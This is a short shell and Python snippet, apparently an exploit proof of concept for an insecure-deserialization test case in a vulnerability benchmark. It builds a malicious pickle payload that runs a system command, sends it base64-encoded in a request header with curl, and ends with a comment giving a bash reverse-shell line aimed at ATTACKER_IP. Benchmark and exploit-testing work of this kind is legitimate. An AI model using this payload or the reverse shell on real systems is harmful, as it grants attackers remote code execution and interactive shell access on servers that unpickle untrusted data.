# Step 1: Generate the malicious pickle payload
python3 -c "
import pickle, base64, os
class RCE:
    def __reduce__(self):
        return (os.system, ('id',))
payload = pickle.dumps(RCE())
encoded = base64.urlsafe_b64encode(payload).decode()
print(encoded)
"

# Step 2: Send it via GET or POST
curl -X POST http://localhost:8443/benchmark/deserialization-00/BenchmarkTest00507 \
  -H 'BenchmarkTest00507: <encoded_payload>'

# Or via GET (same result):
curl http://localhost:8443/benchmark/deserialization-00/BenchmarkTest00507 \
  -H 'BenchmarkTest00507: <encoded_payload>'

# For reverse shell: replace os.system('id') with os.system('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"')